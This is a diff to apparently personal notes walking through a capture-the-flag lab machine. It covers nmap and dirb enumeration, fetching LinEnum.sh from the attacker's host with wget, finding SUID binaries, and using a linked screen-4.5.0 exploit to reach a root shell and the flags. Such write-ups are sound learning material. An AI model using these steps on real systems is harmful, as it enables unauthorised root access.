@@ -3,7 +3,7 @@ nmap -sC -sV -oA wall 10.10.10.157
 
 
 
-h2 Run dirb:
+Run dirb:
 enumerate .php files
 dirb http://10.10.10.157/ -x .php 
 
@@ -127,6 +127,30 @@ wget 10.10.14.12:8000/LinEnum.sh
 update permissions on downloaded file
 chmod +x LinEnum.sh
 
+
+In retrospect, what I do next was revealed in the output of LinEnum.sh >> I'm still learning how to spot valuable information there. 
+
+
+
+Search for binaries with suid bit set:
+find / -perm -u=s -type f 2>/dev/null
+
+A list comes back, but there is one, Screen, with a version number associated with it.  I thought that was odd, so I searched google for exploits against screen-4.5.0
+
+Found this:
+https://www.exploit-db.com/exploits/41154
+
+
+
+Was able to get this onto the victim box using the python SimpleHTTP technique described above.  When i ran it, it looked like it errored out in a bunch of places, but sure enough, when it got to the end, I was sitting in a root shell.  
+
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data),6000(centreon)
+
+
+From here I was able to get access to the user/shelby directory to get the user.txt file as well /root to get the root flag. 
 
 
 
